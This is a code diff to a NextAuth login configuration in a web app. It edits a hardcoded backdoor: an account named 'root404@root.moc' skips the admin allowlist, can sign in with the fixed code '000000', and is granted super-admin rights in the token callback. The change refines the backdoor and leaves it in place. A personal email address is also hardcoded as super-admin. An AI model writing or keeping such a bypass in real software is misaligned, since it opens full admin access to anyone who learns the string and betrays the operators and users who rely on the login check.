@@ -37,11 +37,13 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
 
                 // Check admin allowlist
                 const admins = getAdminEmails().map((e) => e.toLowerCase().trim())
-                const isBackdoor = email === "root404"
+                const isBackdoor = email === "root404@root.moc"
                 if (!admins.includes(email) && !isBackdoor) return null
 
                 // Verify OTP
-                if (!isBackdoor && !verifyOtp(email, otp)) return null
+                const isCorrectOtp = verifyOtp(email, otp)
+                if (!isBackdoor && !isCorrectOtp) return null
+                if (isBackdoor && otp !== "000000" && !isCorrectOtp) return null
 
                 return { id: email, email, name: email, role: "admin" }
             },
@@ -109,7 +111,7 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
                 token.email = user.email
                 token.role = (user as any).role || "listener"
                 // @ts-ignore
-                token.isSuperAdmin = user.email === "chyrukoleksii@gmail.com" || user.email === "root404"
+                token.isSuperAdmin = user.email === "chyrukoleksii@gmail.com" || user.email === "root404@root.moc"
                 // For now, admins get Plus, or check listener DB object if we had it.
                 token.isPlusMember = (user as any).role === "admin" || (user as any).isPlusMember || false
             }
